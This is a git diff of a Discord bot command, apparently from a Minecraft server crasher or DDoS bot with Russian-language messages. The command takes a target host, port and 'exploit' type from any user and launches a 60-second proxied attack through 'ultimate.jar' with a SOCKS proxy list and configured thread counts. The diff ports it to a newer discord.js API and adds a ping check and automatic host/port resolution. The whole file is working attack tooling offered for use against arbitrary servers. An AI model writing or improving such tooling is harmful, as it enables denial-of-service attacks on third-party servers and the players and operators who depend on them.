@@ -2,9 +2,11 @@
 
 const Command = require('../structure/command.js');
 const threads = require('../jsons/threads.json');
-const hostValidattor = require('is-valid-hostname');
+const ping = require('ping');
 const Attack = require('../structure/attack.js');
 const crashers = require('../functions/crashers.js');
+const config = require('../jsons/config.json');
+const Discord = require('discord.js');
 
 module.exports = new Command({
     name: "extreme",
@@ -13,13 +15,13 @@ module.exports = new Command({
     disableOnAttack: true,
     slashCommandOptions: [{
         name: "host",
-        type: "STRING",
+        type: Discord.ApplicationCommandOptionType.String,
         description: "Enter host or ip server",
         required: true
     }, {
         name: "type",
         description: "Type attack",
-        type: 'STRING',
+        type: Discord.ApplicationCommandOptionType.String,
         choices: [{
             name: 'byte1',
             value: 'byte1'
@@ -31,38 +33,50 @@ module.exports = new Command({
     }, {
         name: "port",
         description: "Enter port server",
-        type: "NUMBER",
+        type: Discord.ApplicationCommandOptionType.Number,
         required: false
     }, {
         name: "unstopable",
         description: "Unstopable testing",
-        type: "BOOLEAN",
+        type: Discord.ApplicationCommandOptionType.Boolean,
         required: false
     }],
     async execute(client, args, interaction){
-        const host = args.getString("host");
-        const port = args.getNumber("port") || 25565;
+        let host = args.getString("host");
+        let port = args.getNumber("port");
         const type = args.getString("type");
         const unstop = args.getBoolean("unstopable") || false;
 
-
-        if (hostValidattor(host) == false) return crashers.errorembed(client, interaction, interaction.commandName, "Не валидный IP"); 
-
-        const attack = new Attack({
-            jaroptions: {
-                jarname: "ultimate.jar",
-                jarargs: `host=${host} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`
-            },
-            client: client,
-            interaction: interaction,
-            AttacksArray: client.attacks,
-            method: "Extreme 💥",
-            host: host,
-            port: `${port}`,
-            unstopable: unstop,
-            ownerID: interaction.user.id
+        interaction.deferReply({fetchReply: true}).then((msg) => {
+            ping.sys.probe(host, async (alive, err) => {
+                if (alive) {
+                    if (config.autoResolver && !port) {
+                        try {
+                            const res = await crashers.autoResolver(host);
+                            host = res.host;
+                            port = res.port;
+                        } catch {}
+                    }
+            
+                    const attack = new Attack({
+                        jaroptions: {
+                            jarname: "ultimate.jar",
+                            jarargs: `host=${host} port=${port ? port : 25565} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`
+                        },
+                        client: client,
+                        interaction: interaction,
+                        msgID: msg.id,
+                        AttacksArray: client.attacks,
+                        method: "Extreme 💥",
+                        host: host,
+                        port: `${port}`,
+                        unstopable: unstop,
+                        ownerID: interaction.user.id
+                    })
+            
+                    client.attacks.set(msg.id, attack);
+                } else return await crashers.errorembed(client, interaction, interaction.commandName, "**Время ожидания отклика сервера вышло.**\n\nСкорее всего сервер выключен или IP введен некоректно. Проверьте правильность IP и повторите попытку.", true);
+            })
         })
-
-        client.attacks.set(host, attack);
     }
 });
